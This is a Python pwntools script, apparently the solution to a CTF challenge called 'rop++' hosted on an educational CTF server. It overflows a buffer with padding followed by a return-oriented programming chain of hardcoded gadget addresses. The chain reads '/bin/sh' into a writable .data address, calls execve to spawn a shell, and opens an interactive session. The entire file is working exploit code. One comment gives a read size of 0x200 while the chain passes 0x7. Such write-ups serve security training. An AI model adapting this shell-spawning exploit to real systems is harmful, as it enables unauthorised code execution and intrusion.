from pwn import *


context.arch = 'amd64'


r = remote("edu-ctf.zoolab.org", 10003)
#r = process("./rop++")


# pick a writable address to put our shell string
# 0x4c50e0 is writable address in .data section
writable_addr = 0x4c50e0

pop_rdi_ret = 0x401e3f  # : pop rdi ; ret
pop_rsi_ret = 0x409e6e  # : pop rsi ; ret
pop_rdx_ret = 0x47ed0b  # : pop rdx ; ret not found, use : pop rdx ; pop rbx ; ret
pop_rax_ret = 0x447b27  # : pop rax ; ret
syscall_ret = 0x414506  # : syscall ; ret
leave_ret = 0x401797    # : leave ; ret


ROP = flat(
    # read(0, buf, 0x200)
    pop_rdi_ret, 0,             # fd:0 - stdin
    pop_rsi_ret, writable_addr, # buf - "/bin/sh" string
    pop_rdx_ret, 0x7, 0,        # size
    pop_rax_ret, 0,             # syscall - read
    syscall_ret,
    
    # execve("/bin/sh", 0, 0)
    pop_rdi_ret, writable_addr, # "/bin/sh"
    pop_rsi_ret, 0,             # 0
    pop_rdx_ret, 0, 0,          # 0
    pop_rax_ret, 0x3b,          # syscall - execve
    syscall_ret,
)

s = r.sendafter(b"show me rop\n> ", b'a'*0x20 + b'a'*0x8 + ROP)

r.interactive()
